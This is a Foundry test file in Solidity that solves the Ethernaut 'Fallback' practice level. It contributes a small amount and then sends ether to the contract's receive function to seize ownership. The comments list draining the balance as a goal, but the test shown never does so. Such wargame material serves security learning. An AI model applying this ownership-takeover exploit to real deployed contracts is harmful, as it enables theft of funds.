// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Fallback} from "src/levels/Fallback.sol";
import {FallbackFactory} from "src/levels/FallbackFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestFallbackSolution is Test, Utils {
    Ethernaut ethernaut;
    Fallback instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        FallbackFactory factory = new FallbackFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Fallback(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    function testSolve() public {
        console.log(address(instance));

        // Goals
        // 1. claim ownership of the contract
        // 2. reduce balance to 0

        // claim contribute to make contribution[attacker] > 0

        // assert owner is deployer before attack
        // assertEq(instance.owner(), owner);
        console.log("prevOwner:", instance.owner());

        // start attack as the player
        vm.startPrank(player);
        instance.contribute{value: 0.00005 ether}();

        console.log("Player contribution:",instance.contributions(address(player)));

        // once player contributed can send ether to trigger receive and claim ownership
        address(instance).call{value: 0.05 ether}("");

        // assert that player is the owner now
        assertEq(instance.owner(), player);
    }

}